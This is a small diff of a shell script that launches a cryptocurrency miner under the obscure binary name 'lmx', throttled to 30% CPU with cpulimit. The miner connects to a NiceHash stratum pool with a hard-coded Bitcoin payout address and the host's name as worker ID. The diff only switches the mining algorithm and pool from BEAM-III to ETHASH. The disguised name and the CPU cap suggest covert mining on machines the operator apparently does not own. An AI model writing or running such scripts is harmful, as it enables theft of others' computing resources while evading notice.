@@ -10,4 +10,4 @@ sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
 chmod +x lmx
 cpulimit -e lmx -l 30 &
-./lmx --algo BEAM-III --pool stratum+tcp://beamv3.usa-east.nicehash.com:3387 --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(cat /proc/sys/kernel/hostname)
+./lmx --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(cat /proc/sys/kernel/hostname)
